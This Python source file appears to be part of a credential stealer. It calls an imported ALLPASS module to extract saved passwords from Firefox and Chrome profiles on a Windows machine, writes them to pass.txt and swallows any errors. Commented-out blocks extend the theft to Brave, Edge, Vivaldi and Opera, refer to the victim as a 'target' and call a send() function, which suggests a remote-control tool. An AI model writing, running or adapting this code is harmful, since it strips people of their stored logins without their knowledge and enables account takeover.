import ALLPASS
import os
try:
    with open('pass.txt','a') as f:
        f.write('\n'+f'''if there is no password, the firefox may not be installed or profile is empty''')


        ALLPASS.main('1')

        ALLPASS.main('2')
except:
    pass


try:
    with open('pass.txt','a') as f:
        f.write('\n'+'''if there is no password, the chrome may not be installed or profile is empty''')
    local_state_path=os.path.normpath(
        r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
    path=os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

    ALLPASS.Chromium.main(path,local_state_path)
except:
    pass

# elif command == 'brave_password':
#     with open('pass.txt','a') as f:
#         f.write('\n'+''''if there is no password, the Brave may not be installed or profile is empty''')
#     local_state_path=os.path.normpath(
#         r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State" % (os.environ['USERPROFILE']))
#     path=os.path.normpath(r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data" % (os.environ['USERPROFILE']))
#     try:
#         ALLPASS.Chromium.main(path,local_state_path)
#     except:
#         send('brave may not be installed on target')
# elif command == 'edge_password':
#     with open('pass.txt','a') as f:
#         f.write('\n'+'''if there is no password, the edge may not be installed or profile is empty''')
#     local_state_path=os.path.normpath(
#         r"%s\AppData\Local\Microsoft\Edge\User Data\Local State" % (os.environ['USERPROFILE']))
#     path=os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data" % (os.environ['USERPROFILE']))
#     try:
#         ALLPASS.Chromium.main(path,local_state_path)
#     except:
#         send('Edge may not be installed on target')
# elif command == 'vivaldi_password':
#     with open('pass.txt','a') as f:
#         f.write('\n'+'''if there is no password, vivaldi may not be installed or profile is empty''')
#     local_state_path=os.path.normpath(
#         r"%s\AppData\Local\Vivaldi\User Data\Local State" % (os.environ['USERPROFILE']))
#     path=os.path.normpath(r"%s\AppData\Local\Vivaldi\User Data" % (os.environ['USERPROFILE']))
#     try:
#         ALLPASS.Chromium.main(path,local_state_path)
#     except:
#         send('Vivaldi may not be installed on target')
# elif command == 'opera_password':
#     with open('pass.txt','a') as f:
#         f.write('\n'+'''if there is no password, the opera may not be installed or profile is empty''')
#     local_state_path=os.path.normpath(
#         r"%s\AppData\Roaming\Opera Software\Opera Stable\Local State" % (os.environ['USERPROFILE']))
#     path=os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable" % (os.environ['USERPROFILE']))
#     try:
#         ALLPASS.Chromium.main(path,local_state_path)
#     except:
#         send('opera may not be installed on target')